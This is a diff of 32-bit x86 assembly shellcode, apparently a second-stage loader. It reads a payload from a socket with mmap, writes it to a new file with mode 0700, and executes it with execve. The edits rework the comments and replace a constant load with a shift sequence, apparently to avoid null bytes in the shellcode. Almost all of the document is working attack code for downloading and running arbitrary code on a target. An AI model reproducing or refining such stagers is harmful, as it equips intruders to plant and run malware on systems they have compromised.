@@ -19,7 +19,6 @@ BITS 32
 	; assumption - ebx has the input (socket)
 		
 main:
-
 	; ebx = 0
 	; ecx = size
 	; edx = 0x3
@@ -27,6 +26,7 @@ main:
 	; edi = eax
 	; ebp = 0
 
+	; mmap(0, 1M, PROT_READ|PROT_WRITE, MAP_PRIVATE, input_fd, 0)
 	mov edi, ebx            ; edi = input
 	xor ecx, ecx
 	mov cl, 0x1
@@ -39,11 +39,13 @@ main:
 	mov edx, ebp  		
 	mov dl, 0x3 		; edx = 3
 	mov al, __NR_mmap
-	int 0x80 		; mmap(0, 1M, PROT_READ|PROT_WRITE, MAP_PRIVATE, input_fd, 0)
+	int 0x80 		; call mmap
 
+	; (temp assignment)
 	mov esi, ecx            ; esi = size
 	mov edi, eax            ; edi = buffer (temp assignment)
 
+	; open(filename, O_CREAT|O_RDWR, 0700
 	xor eax, eax 
 	push eax
 	push dword stackcookie  ; use the stack cookie as a file name 
@@ -51,18 +53,21 @@ main:
 	mov ebx, esp            ; ebx = stack
 	mov ecx, eax
 	mov cl, 0x42 		; ecx = O_CREAT|O_RDWR
-	mov edx, 0700 		; edx = 0700
+	mov edx, eax	
+	mov dl, 0x7
+	shl dl, 0x6		; edx = 111000000 = 0700
 	mov al, __NR_open 
-	int 0x80 		; open(filename, O_CREAT|O_RDWR, 0600)
+	int 0x80 		; call open 
 
+	; write(output, buffer, size)
 	mov ebx, eax 		; ebx = output
 	mov ecx, edi 		; ecx = buffer
 	mov edx, esi 		; edx = size
 	xor eax, eax
 	mov al, __NR_write
-	int 0x80 		; write(output, buffer, size)
+	int 0x80 		; call write 
 	
-	; exec 
+	; execve(filename, 0, 0) 
 	mov ebx, esp 		; ebx = filename
 	xor ecx, ecx
 	mov edx, ecx
